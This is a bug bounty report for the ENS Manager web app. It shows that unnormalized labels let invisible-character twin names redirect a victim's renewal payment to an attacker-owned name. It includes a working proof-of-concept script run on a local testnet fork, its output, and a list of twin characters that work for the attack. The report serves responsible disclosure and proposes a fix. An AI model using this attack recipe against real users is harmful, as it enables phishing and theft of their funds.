# 93118 w a critical missing ensip 15 normalization on the register and renew write paths lets an attacker redirect a victim s renewal payment to a name the attacker owns

**Submitted on Sep 14th 2026 at 09:58:14 UTC by @tomX0 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93118
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

Nothing on the Manager's registration or renewal path applies ENSIP-15 normalization. The label the app validates, prices and displays on screen is not necessarily the label it encodes into `makeCommitment`, `register` and `renew` calldata.

An attacker registers an invisible-character twin of a victim's name and sends the victim a renewal link. The page resolves and displays the victim's own genuine expiry date, every eligibility check passes, and the victim approves. The transaction extends the attacker's registration instead. The victim's own name is untouched and keeps counting down toward release.

The same root cause has a second outcome. A user can pay for a label that ENSIP-15 rejects outright. The registrar accepts it and mints it, but the resulting name cannot be resolved by any conformant client, including the Manager's own profile and primary-name paths. Registration is one-way, so the user has paid full price for an asset that is inert on arrival.

Both are demonstrated on chain below, each with a control case.

Everything needed to reproduce is inside this report. There are no attachments.

## Vulnerability Details

### Root cause

Across the whole Manager app, `normalize` from `viem/ens` is imported in exactly two files: `profile/service/profileName.ts` and `profile/service/setPrimaryName.ts`. Every other name path uses a homegrown parser.

```ts
// register-v2/utils/name-parser.ts
const INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/
...
const normalized = name.trim().toLowerCase()
```

`toLowerCase()` performs no UTS-46 mapping, no NFC composition, no label-extension check and no underscore-placement check. The only character filter is an ASCII punctuation blocklist. The sibling validator `validateENSName` in `shared/registration/nameUtils.ts` repeats that same blocklist and adds a three-code-point minimum. `utils/domain.ts` only strips and re-appends `.eth` and byte-truncates.

### The renewal path reads one name and transacts on another

Inside the `renew/$name` route loader, the same route parameter is handed to four consumers that do not agree on what it means:

1. `parseRenewableName(name)` calls `parseName`, which receives the raw input.
2. `profileExpiryQuery(name)` calls `getExpiry`, then `normalizeEth2LdName`, then `normalize()`, so this one receives the normalized name.
3. `canRenewV2Name(name, expiryDate)` is evaluated with the raw label against the normalized expiry.
4. The loader returns `{ label: parsedName.value.label }`, which is the raw label.

The eligibility and expiry gate is therefore evaluated against the victim's real name, while the label handed to the renewal flow is the raw one. It reaches the chain unchanged:

```ts
// transaction-manager, registration.actors.ts
const cleanLabel = label.replace('.eth', '')
return encodeFunctionData({
  functionName: 'renew',
  args: [cleanLabel, duration, paymentToken, referrer],
})
```

There is no `normalize()` call anywhere on that path. This is the "modifying transaction arguments" impact in its literal form. The first argument to `renew()` is not the name the user was shown, and the user has no way to tell from the interface.

### The registration path buys a label no conformant client resolves

`register/$name` derives its label from `parseName`, and every downstream consumer uses that same raw value: the availability query, which reaches ensjs `getAvailable` and passes the raw leaf label to `isAvailable`, the price query, and both re-checks in `PricingStep` and `ConfirmPurchase`. Because all of them use the same raw label, none of them can detect the divergence. They agree with each other and disagree with the standard. The label then flows into `makeCommitment` and `register`.

### The app already contradicts itself

`setPrimaryName.ts` carries this comment, and normalizes:

```ts
// Normalized claim string: a non-canonical name would fail the bidirectional
// check at resolution time and read as "no primary name".
const withEthSuffix = (name: string) =>
  normalize(name.endsWith('.eth') ? name : `${name}.eth`)
```

The project already knows a non-canonical label is unresolvable, and guards the primary-name write. It does not guard the write that decides which name the user pays for. After registering a raw label, `setPrimaryName` targets a different node than the one that was purchased.

### Attack scenario

1. The attacker registers `victim<U+00AD>.eth`, the invisible-character twin of a name they want to profit from. U+00AD SOFT HYPHEN renders as nothing in normal text.
2. The attacker sends the owner a renewal link pointing at `/renew/victim<U+00AD>.eth`.
3. The loader reads expiry through `normalize()`, so it resolves the victim's real name. The page shows the genuine expiry date and passes every eligibility check.
4. The price query and the `renew()` calldata use the raw label, which is the attacker's name.
5. The victim approves. Their funds extend the attacker's registration. Their own name keeps expiring toward release.

The victim is doing something entirely routine. They follow a link to renew their own name, on a page that shows them their correct expiry date. Nineteen distinct twin characters work for this, listed in the Part 1 output below, of which five are fully invisible.

## Impact Details

On the renewal path the victim loses funds and receives nothing. The payment settles against a registration the attacker owns, so the attacker gains a year of registration they did not pay for, while the victim's own name continues counting down toward release. The attacker can repeat this against every holder whose name they have twinned.

On the registration path the user pays full price for an asset that is inert on arrival. The name exists in the registry but no conformant resolver will return it, so it cannot back a profile, cannot be set as a primary name, and cannot be sold to anyone whose client normalizes. There is no recovery short of buying the correct name again.

Neither case requires the attacker to compromise a key, obtain wallet access, or interact with the contracts on the victim's behalf. The renewal case needs only a link.

### On the severity selection

I have selected Critical against "malicious interactions with an already-connected wallet, specifically modifying transaction arguments or parameters." The label argument the application encodes into `renew()` is not the label it validated, priced and displayed, and the user signs the difference. "Direct theft of user funds" also applies, since the victim's payment ends up benefiting the attacker, but the argument-substitution impact is the more precise description of the mechanism.

The one precondition is that the victim opens an attacker-supplied link. I am stating that up front rather than burying it. I do not think it belongs in the usual "requires user interaction, therefore downgrade" bucket, because the page presents the victim with entirely correct information at the moment of approval. The expiry date shown is their real expiry date. Every eligibility check passes against their real name. The standard mitigation, which is that an attentive user verifies what is on screen before signing, is unavailable here, because what is on screen is correct and the divergence exists only in the calldata.

If the program classifies this asset under a scheme that caps application-layer findings below Critical, the appropriate downgrade is to High rather than Medium, since funds move and the attacker profits directly.

## Proof of Concept

## Proof of Concept

The script below runs all three parts. It copies the Manager's two validators verbatim into itself, so the divergence is measured against the real application code rather than a paraphrase of it, and so Part 1 reproduces without a repository checkout.

Part 1 is offline and needs only `viem`. Parts 2 and 3 need `@ensdomains/ensjs` as well, plus a running Anvil fork.

### Environment

Network: Sepolia, chain id 11155111, forked locally with Anvil. Nothing touches mainnet or a public testnet.

Contracts:

* ETH Registrar: `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`
* Test USDC, freely mintable: `0x768F42455A2D082E23ceeF7d51e5787C82d67a39`
* Resolver: `0x640294a2b2d87e7f522db3e3e3e876764bce170d`

Accounts: the attacker is Anvil account 0, the victim is Anvil account index 2 from the standard test mnemonic. Both are funded with test USDC by the script itself.

Libraries: `viem` for ENSIP-15 `normalize()`, which wraps `@adraffy/ens-normalize`, and `@ensdomains/ensjs` for the conformant-client lookup in Part 2. The Part 1 output below was produced with viem 2.56.5. The exact counts can shift by one or two under a different pinned `ens-normalize`, since that library's rules evolve. The divergence itself does not depend on the version.

One environment note that will cost a reviewer time otherwise: Anvil forks inherit EIP-7702 delegations that have been squatted onto the well-known test accounts on Sepolia. Those delegations revert inside `onERC1155Received` during registration. The script clears them with `anvil_setCode` before doing anything else.

### Steps to reproduce

Start the fork:

```
anvil --fork-url <sepolia-rpc> --chain-id 11155111
```

Then either place the script in `apps/manager/` so the repository's pinned dependencies resolve, which is what I would suggest for exact pinned behaviour, or run it standalone:

```
mkdir poc && cd poc
npm init -y
npm pkg set type=module
npm install viem @ensdomains/ensjs
# save the script below as poc.mjs
node poc.mjs
```

The random suffix keeps each run independent, so the exact label strings in the Part 2 and Part 3 output will differ between runs.

### poc.mjs

```js
/**
 * PoC - The Manager registers and renews ENS labels it never normalizes, so the
 *       label written on chain differs from the one it validated and displayed.
 *
 * SETUP
 *   1. anvil --fork-url <sepolia-rpc> --chain-id 11155111
 *   2. Place this file in apps/manager/ (so the repo's pinned viem and
 *      @ensdomains/ensjs resolve), or run it in a scratch directory after
 *      npm install viem @ensdomains/ensjs
 *   3. node poc.mjs
 *
 * THREE PARTS
 *   PART 1  offline differential: every input the Manager's own validators accept
 *           whose on-chain label differs from what ENSIP-15 says the name means
 *   PART 2  on chain: the registrar accepts labels ENSIP-15 rejects outright, and
 *           the resulting name is unresolvable by any conformant client
 *   PART 3  on chain: with the attacker holding the invisible-character twin, the
 *           victim's renewal payment extends the ATTACKER's registration
 */
import {
  createPublicClient, createWalletClient, http, encodeFunctionData, parseAbi, labelhash,
} from 'viem'
import { privateKeyToAccount, mnemonicToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { normalize } from 'viem/ens'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getOwner as getOwnerV2 } from '@ensdomains/ensjs/public/v2'

// ---------------------------------------------------------------------------
// The Manager's two name validators, copied verbatim from the application.
//   apps/manager/src/features/register-v2/utils/name-parser.ts        (parseName)
//   apps/manager/src/features/shared/registration/nameUtils.ts  (validateENSName)
// Neither calls ENSIP-15 normalize(). Their only character filter is an ASCII
// punctuation blocklist.
// ---------------------------------------------------------------------------
const INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/

const parseName = (name) => {
  const n = name.trim().toLowerCase()
  if (/\s/.test(n)) return null
  if (n.includes('..')) return null
  const labels = n.split('.').filter(Boolean)
  const hasTld = labels.length > 1
  const tld = hasTld ? labels.pop() : 'eth'
  const label = labels.pop()
  if (!label || !tld) return null
  if ([...labels, label, tld].some((p) => INVALID_LABEL_CHARS.test(p))) return null
  return { label, tld }
}

const validateENSName = (name) => {
  const trimmed = name.trim()
  if (!trimmed) return null
  const hasEth = trimmed.toLowerCase().endsWith('.eth')
  const label = hasEth ? trimmed.slice(0, -4).trim() : trimmed.trim()
  if (trimmed.includes(' ')) return 'INVALID_FORMAT'
  if (trimmed.includes('..')) return 'INVALID_FORMAT'
  if (label.includes('.')) return 'INVALID_FORMAT'
  const n = [...label].length
  if (n > 0 && n < 3) return 'TOO_SHORT'
  if (label.length > 0 && INVALID_LABEL_CHARS.test(label)) return 'INVALID_CHARACTER'
  return null // null == accepted
}

// The Explorer's validator, for contrast: apps/portal/src/utils/token/isNormalized.ts
const portalAccepts = (label) => {
  try { return normalize(label) === label } catch { return false }
}

const cp = (n) => String.fromCodePoint(n)
const esc = (s) => {
  if (s == null) return String(s)
  let out = ''
  for (const ch of String(s)) {
    const c = ch.codePointAt(0)
    out += c >= 0x20 && c <= 0x7e ? ch : `\\u{${c.toString(16)}}`
  }
  return `"${out}"`
}

// ===========================================================================
console.log('=== PART 1 - offline differential ===\n')
// ===========================================================================
const corpus = new Set()
// pure ASCII: ENSIP-15 label-extension and underscore-placement rules.
// No homoglyph, no bidi, no control character, no leading/trailing dot.
for (const s of ['fo_o', 'a_b_c', 'ab--cd', 'xn--a', '12--34', 'ab--']) corpus.add(s)
// invisible / format characters and combining marks
for (const n of [0x00ad, 0x200b, 0x200c, 0x200d, 0x2060, 0xfeff, 0xfe0f, 0xfe0e,
  0x034f, 0x180e, 0x061c, 0x200e, 0x200f, 0x202a, 0x202b, 0x202c, 0x202d, 0x202e,
  0x2066, 0x2067, 0x2068, 0x2069, 0x0000]) corpus.add(`ali${cp(n)}ce`)
// compatibility / confusable substitutions
for (const [from, to] of [['a', cp(0xff41)], ['c', cp(0xff43)], ['i', cp(0x0130)],
  ['s', cp(0x017f)], ['l', cp(0x217c)], ['v', cp(0x2174)], ['o', cp(0x03bf)],
  ['e', cp(0x0435)], ['a', cp(0x0430)], ['i', cp(0x0131)]]) {
  if ('alice'.includes(from)) corpus.add('alice'.replace(from, to))
  corpus.add(to + 'alice')
}
for (const n of [0x2460, 0x24b6, 0x1d400, 0x1d41a, 0x0132, 0xfb00]) corpus.add(cp(n) + 'alice')

const unresolvable = []
const wrongName = []
for (const label of corpus) {
  const input = `${label}.eth`
  const p = parseName(input)
  const writes = p ? p.label : null
  if (validateENSName(input) !== null || writes === null) continue // Manager rejects it
  let norm = null
  try { norm = normalize(input).split('.')[0] } catch {
    unresolvable.push({ label, writes, portalRejects: !portalAccepts(label) }); continue
  }
  if (writes !== norm) wrongName.push({ label, writes, norm, portalRejects: !portalAccepts(label) })
}

console.log(`corpus: ${corpus.size}   accepted-and-divergent: ${unresolvable.length + wrongName.length}\n`)
console.log(`CLASS A - buys a name no conformant client can resolve: ${unresolvable.length}`)
for (const r of unresolvable) console.log(`   ${esc(r.label).padEnd(30)} registers ${esc(r.writes)}`)
console.log(`\nCLASS B - transacts on a different node than displayed: ${wrongName.length}`)
for (const r of wrongName) {
  console.log(`   ${esc(r.label).padEnd(26)} registers ${esc(r.writes).padEnd(26)} displayed-as ${esc(r.norm)}`)
}
const all = [...unresolvable, ...wrongName]
console.log(`\nOf these ${all.length}, the Explorer's validator would have rejected ` +
  `${all.filter((r) => r.portalRejects).length}.`)

// ===========================================================================
console.log('\n\n=== PART 2 / 3 - on chain ===\n')
// ===========================================================================
const RPC = process.env.RPC_URL ?? 'http://127.0.0.1:8545'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http(RPC) })

const attacker = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const victim = mnemonicToAccount('test test test test test test test test test test test junk', { addressIndex: 2 })

const REG = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'
const RES = '0x640294a2b2d87e7f522db3e3e3e876764bce170d'
const ZERO = '0x0000000000000000000000000000000000000000'
const ZH = `0x${'00'.repeat(32)}`

const regAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function isAvailable(string label) view returns (bool)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function getRenewPrice(string label, uint64 duration, address paymentToken) view returns (uint256)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256)',
  'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)',
])
const tokAbi = parseAbi([
  'function mint(address to,uint256 amount)',
  'function approve(address spender,uint256 amount) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
])

const rpc = (m, p) => fetch(RPC, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }),
}).then((r) => r.json())
const wc = (a) => createWalletClient({ account: a, chain, transport: http(RPC) })
const send = async (w, to, data) => {
  const h = await w.sendTransaction({ to, data })
  const r = await pub.waitForTransactionReceipt({ hash: h })
  if (r.status !== 'success') throw new Error('reverted')
  return r
}
const prep = async (acct) => {
  // anvil forks inherit EIP-7702 delegations squatted on the test accounts;
  // they revert inside onERC1155Received. Clear them.
  await rpc('anvil_setCode', [acct.address, '0x'])
  await rpc('anvil_setBalance', [acct.address, `0x${(10n ** 20n).toString(16)}`])
  await send(wc(attacker), USDC, encodeFunctionData({ abi: tokAbi, functionName: 'mint', args: [acct.address, 50_000_000_000n] }))
  await send(wc(acct), USDC, encodeFunctionData({ abi: tokAbi, functionName: 'approve', args: [REG, 50_000_000_000n] }))
}
const register = async (acct, label) => {
  const secret = `0x${'33'.repeat(32)}`
  const dur = 31536000n
  const cm = await pub.readContract({ address: REG, abi: regAbi, functionName: 'makeCommitment', args: [label, acct.address, secret, ZERO, RES, dur, ZH] })
  await send(wc(acct), REG, encodeFunctionData({ abi: regAbi, functionName: 'commit', args: [cm] }))
  await rpc('evm_increaseTime', [90]); await rpc('evm_mine', [])
  await send(wc(acct), REG, encodeFunctionData({ abi: regAbi, functionName: 'register', args: [label, acct.address, secret, ZERO, RES, dur, USDC, ZH] }))
}

await prep(attacker); await prep(victim)
const SUF = String(Math.floor(Math.random() * 1e6))

// --- PART 2: does the registrar accept ENSIP-15-invalid labels? -------------
console.log('PART 2 - registering labels ENSIP-15 rejects\n')
for (const stem of ['fo_o', 'ab--cd', 'xn--a', 'plain']) {
  const label = stem + SUF
  let normVerdict
  try { normVerdict = `normalize -> ${JSON.stringify(normalize(`${label}.eth`))}` }
  catch { normVerdict = 'normalize THROWS' }
  const avail = await pub.readContract({ address: REG, abi: regAbi, functionName: 'isAvailable', args: [label] })
  let outcome
  try { await register(attacker, label); outcome = 'REGISTERED' } catch { outcome = 'register reverted' }
  let lookup
  try { lookup = JSON.stringify(await getOwnerV2(pub, { name: normalize(`${label}.eth`) })) }
  catch { lookup = 'UNRESOLVABLE by any conformant client' }
  console.log(`  ${esc(label).padEnd(16)} ${normVerdict.padEnd(34)} isAvailable=${avail}  ${outcome}`)
  console.log(`  ${''.padEnd(16)} conformant lookup: ${lookup}`)
}
console.log('\n  (the "plain" row is the control: it registers AND resolves)')

// --- PART 3: renewal theft ---------------------------------------------------
console.log('\n\nPART 3 - renewal of an invisible-character twin\n')
const BASE = `renewdemo${SUF}`
const IMPOSTOR = `${BASE}\u{00AD}` // U+00AD SOFT HYPHEN - renders as nothing

console.log(`  victim name  : ${JSON.stringify(`${BASE}.eth`)}`)
console.log(`  attacker name: ${esc(`${IMPOSTOR}.eth`)}  (visually identical)`)
console.log(`  normalize(attacker name) -> ${JSON.stringify(normalize(`${IMPOSTOR}.eth`))}`)
console.log(`  labelhash differ: ${labelhash(BASE)} vs ${labelhash(IMPOSTOR)}\n`)

await register(victim, BASE)

// (a) nobody registered the twin -> the renewal simply reverts
const NEVER = `neverreg${SUF}\u{00AD}`
let caseA
try {
  await pub.readContract({ address: REG, abi: regAbi, functionName: 'getRenewPrice', args: [NEVER, 31536000n, USDC] })
  await send(wc(victim), REG, encodeFunctionData({ abi: regAbi, functionName: 'renew', args: [NEVER, 31536000n, USDC, ZH] }))
  caseA = 'SUCCEEDED'
} catch { caseA = 'REVERTED' }
console.log(`  (a) twin never registered  -> renew() ${caseA}`)

// (b) the attacker holds the twin -> the victim's money extends the attacker's name
await register(attacker, IMPOSTOR)
const before = await pub.readContract({ address: USDC, abi: tokAbi, functionName: 'balanceOf', args: [victim.address] })
let caseB
try {
  const price = await pub.readContract({ address: REG, abi: regAbi, functionName: 'getRenewPrice', args: [IMPOSTOR, 31536000n, USDC] })
  await send(wc(victim), REG, encodeFunctionData({ abi: regAbi, functionName: 'renew', args: [IMPOSTOR, 31536000n, USDC, ZH] }))
  caseB = `SUCCEEDED (price ${price})`
} catch (e) { caseB = `REVERTED (${String(e.message).split('\n')[0].slice(0, 60)})` }
const after = await pub.readContract({ address: USDC, abi: tokAbi, functionName: 'balanceOf', args: [victim.address] })

console.log(`  (b) attacker holds the twin -> renew() ${caseB}`)
console.log(`      victim USDC spent: ${(before - after).toString()} (6 decimals)`)
console.log('\n=== RESULT ===')
if (before - after > 0n) {
  console.log("The victim paid to extend a registration owned by the attacker.")
  console.log('Their own name was not renewed and continues to expire.')
} else {
  console.log('No victim funds moved.')
}
```

### Part 1 output, the size of the divergence

Of a 52-case corpus, 51 inputs are accepted by both Manager validators and diverge on chain. 32 of them buy a name no conformant client can resolve. The other 19 transact against a different node than the one the user is shown, and every one of those 19 is a working twin for the renewal attack.

```
=== PART 1 - offline differential ===

corpus: 52   accepted-and-divergent: 51

CLASS A - buys a name no conformant client can resolve: 32
   "fo_o"                         registers "fo_o"
   "a_b_c"                        registers "a_b_c"
   "ab--cd"                       registers "ab--cd"
   "xn--a"                        registers "xn--a"
   "12--34"                       registers "12--34"
   "ab--"                         registers "ab--"
   "ali\u{200c}ce"                registers "ali\u{200c}ce"
   "ali\u{200d}ce"                registers "ali\u{200d}ce"
   "ali\u{34f}ce"                 registers "ali\u{34f}ce"
   "ali\u{180e}ce"                registers "ali\u{180e}ce"
   "ali\u{61c}ce"                 registers "ali\u{61c}ce"
   "ali\u{200e}ce"                registers "ali\u{200e}ce"
   "ali\u{200f}ce"                registers "ali\u{200f}ce"
   "ali\u{202a}ce"                registers "ali\u{202a}ce"
   "ali\u{202b}ce"                registers "ali\u{202b}ce"
   "ali\u{202c}ce"                registers "ali\u{202c}ce"
   "ali\u{202d}ce"                registers "ali\u{202d}ce"
   "ali\u{202e}ce"                registers "ali\u{202e}ce"
   "ali\u{2066}ce"                registers "ali\u{2066}ce"
   "ali\u{2067}ce"                registers "ali\u{2067}ce"
   "ali\u{2068}ce"                registers "ali\u{2068}ce"
   "ali\u{2069}ce"                registers "ali\u{2069}ce"
   "ali\u{0}ce"                   registers "ali\u{0}ce"
   "al\u{130}ce"                  registers "ali\u{307}ce"
   "\u{130}alice"                 registers "i\u{307}alice"
   "\u{3bf}alice"                 registers "\u{3bf}alice"
   "alic\u{435}"                  registers "alic\u{435}"
   "\u{435}alice"                 registers "\u{435}alice"
   "\u{430}lice"                  registers "\u{430}lice"
   "\u{430}alice"                 registers "\u{430}alice"
   "al\u{131}ce"                  registers "al\u{131}ce"
   "\u{131}alice"                 registers "\u{131}alice"

CLASS B - transacts on a different node than displayed: 19
   "ali\u{ad}ce"              registers "ali\u{ad}ce"              displayed-as "alice"
   "ali\u{200b}ce"            registers "ali\u{200b}ce"            displayed-as "alice"
   "ali\u{2060}ce"            registers "ali\u{2060}ce"            displayed-as "alice"
   "ali\u{fe0f}ce"            registers "ali\u{fe0f}ce"            displayed-as "alice"
   "ali\u{fe0e}ce"            registers "ali\u{fe0e}ce"            displayed-as "alice"
   "\u{ff41}lice"             registers "\u{ff41}lice"             displayed-as "alice"
   "\u{ff41}alice"            registers "\u{ff41}alice"            displayed-as "aalice"
   "ali\u{ff43}e"             registers "ali\u{ff43}e"             displayed-as "alice"
   "\u{ff43}alice"            registers "\u{ff43}alice"            displayed-as "calice"
   "\u{17f}alice"             registers "\u{17f}alice"             displayed-as "salice"
   "a\u{217c}ice"             registers "a\u{217c}ice"             displayed-as "alice"
   "\u{217c}alice"            registers "\u{217c}alice"            displayed-as "lalice"
   "\u{2174}alice"            registers "\u{2174}alice"            displayed-as "valice"
   "\u{2460}alice"            registers "\u{2460}alice"            displayed-as "1alice"
   "\u{24b6}alice"            registers "\u{24d0}alice"            displayed-as "aalice"
   "\u{1d400}alice"           registers "\u{1d400}alice"           displayed-as "aalice"
   "\u{1d41a}alice"           registers "\u{1d41a}alice"           displayed-as "aalice"
   "\u{132}alice"             registers "\u{133}alice"             displayed-as "ijalice"
   "\u{fb00}alice"            registers "\u{fb00}alice"            displayed-as "ffalice"
```

The first five Class B rows are fully invisible, so the impostor and the real name are indistinguishable on screen. The rest differ only by a confusable glyph. Also worth noting that `ali\u{0}ce`, a label containing a NUL byte, passes both Manager validators.

The Explorer's validator, which lives in the same monorepo, would have rejected all 51.

### Part 2 output, the registrar accepts what ENSIP-15 rejects

```
"fo_o429136"     normalize THROWS                isAvailable=true  REGISTERED
                 conformant lookup: UNRESOLVABLE by any conformant client
"ab--cd429136"   normalize THROWS                isAvailable=true  REGISTERED
                 conformant lookup: UNRESOLVABLE by any conformant client
"xn--a429136"    normalize THROWS                isAvailable=true  REGISTERED
                 conformant lookup: UNRESOLVABLE by any conformant client
"plain429136"    normalize -> "plain429136.eth"  isAvailable=true  REGISTERED
                 conformant lookup: 0xf39Fd6e5...92266                (control)
```

The control row registers and resolves normally, so the harness is sound. The other three are bricked on arrival. The user paid, and the asset is inert.

Worth stressing that `fo_o`, `ab--cd` and `xn--a` are plain ASCII. There is no homoglyph, bidi character, control character or leading dot involved. ENSIP-15 rejects them under the underscore-placement and label-extension rules, and neither Manager validator implements either rule.

### Part 3 output, the renewal and the loss

```
victim name  : "renewdemo429136.eth"
attacker name: "renewdemo429136\u{ad}.eth"   (visually identical)
normalize(attacker name) -> "renewdemo429136.eth"
labelhash differ: 0x791eee43...ac5641  vs  0xd10fec0e...cfdaae0

(a) twin never registered  -> renew() REVERTED
(b) attacker holds the twin -> renew() SUCCEEDED (price 8000021)
    victim USDC spent: 8000021
```

The `normalize()` line is the whole bug in one place. The attacker's label normalizes to the victim's name, which is why the page resolves and displays the victim's real expiry, but the labelhashes are different, which is why the money lands somewhere else.

Case (a) bounds the harmless variant. A divergent label nobody owns simply reverts, so a stray link costs only gas, though the victim's real name still is not renewed and they believe it was.

Case (b) is the attack. The victim's payment settled against the attacker's registration.

## Known issue and duplicate analysis

EXP-INPUT-005 is the entry a triager will reach for first, so I want to address it directly rather than hope it gets missed. That entry describes validators accepting homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot, and it states the impact is homograph-style display confusion in the UI rather than incorrect resolution. It is rated Medium.

A reviewer can fairly say the root-cause sentence is shared. Both are "our validators accept inputs ENSIP-15 rejects or transforms." What separates this report is the program's own carve-out for new consequences of a listed root cause that materially change its severity. EXP-INPUT-005 self-limits to display confusion. What is demonstrated here is a victim's funds settling against an attacker's asset, and a paid registration that produces an unresolvable name, both on chain and both with a control case. That is a change in severity class, not a different exploitation path toward the same impact.

Separately, the strongest registration cases sit outside that entry's enumerated inputs altogether. `fo_o`, `a_b_c`, `ab--cd`, `xn--a`, `12--34` and `ab--` are pure ASCII with no confusable or control character in them.

I also reviewed the remaining known-issue entries covering the Manager, the transaction manager, account abstraction, input validation, and the gap and tracker items. None of them reach the write path on registration or renewal. The closest is a note about renewal being temporarily blocked after registration, which is unrelated.

## Adjacent prior art, disclosed

There is an open issue and an unmerged pull request in `@ensdomains/ensjs` about `getAvailable` hashing the raw label instead of the normalized one. I am disclosing it because a reviewer will find it, and because I think it corroborates this finding rather than disqualifying it:

* `@ensdomains/ensjs` is an unmodified third-party dependency of this monorepo, and the program places unmodified third-party dependencies out of scope. The root cause reported here is in `apps/manager`.
* That fix only touches the availability read. The label reaching `makeCommitment`, `register` and `renew` does not pass through `getAvailable`. Merging it would change what the UI reports for some inputs. It would not stop the Manager encoding a non-normalized label into calldata, and it does not touch the renewal path at all.
* That issue is specifically about emoji and variation selectors. The pure-ASCII cases above are unrelated to it.
* The dependency pinned in this repository predates the fix in any case.

Together with the merged ensjs change that enforces normalization in `getName`, these show the organization treats missing ENSIP-15 normalization as a defect to fix rather than intended behaviour.

The target repository itself has no issues and no relevant pull requests or commits, the upstream monorepo is private, and I found no public disclosure of this.

## Recommended fix

Replace `parseName`'s `trim().toLowerCase()` with ENSIP-15 `normalize()`, and delete the ASCII blocklists in `name-parser.ts` and `nameUtils.ts`. Normalization subsumes them, and keeping both around invites the two to drift apart again.

In the `register/$name` and `renew/$name` loaders, normalize the route parameter before anything else uses it. On throw, render an invalid-name state rather than continuing into a paid flow. Where `normalize(param) !== param`, redirect to the canonical path so that the URL, the displayed name and the calldata all agree. That last part is what actually closes the renewal attack, because it removes the ability to address a page by a label that is not the label the page will transact on.

Add a regression assertion on the write path:

```ts
labelhash(labelSentOnChain) === labelhash(normalize(userInput))
```

The Part 1 corpus works as a ready-made test vector set. The three pure-ASCII cases, `fo_o`, `ab--cd` and `xn--a`, are the cheapest smoke test, since they need no Unicode handling in the test harness at all. The Explorer's `isValidEnsName` is already a working implementation of the check the Manager is missing, so the fix is mostly a matter of using what is already in the repository.

## References

Affected routes:

* `/register/$name`
* `/renew/$name`

Affected source:

* `apps/manager/src/features/register-v2/utils/name-parser.ts`, function `parseName`
* `apps/manager/src/features/shared/registration/nameUtils.ts`, function `validateENSName`
* `apps/manager/src/features/shared/utils/domain.ts`
* the `register/$name` and `renew/$name` route loaders
* transaction-manager, `registration.actors.ts`, calldata encoding

Supporting code, cited as contrast rather than as the bug:

* `apps/manager/src/features/profile/service/setPrimaryName.ts`, which normalizes and documents why
* `apps/portal/src/utils/token/isNormalized.ts`, the Explorer's conformant validator

Standard:

* ENSIP-15, the ENS name normalization standard, <https://docs.ens.domains/ensip/15/>
* ENS name processing documentation, which states a name must be normalized before hashing and that an integration should reject a name it cannot normalize rather than hashing the raw input, <https://docs.ens.domains/resolution/names/>
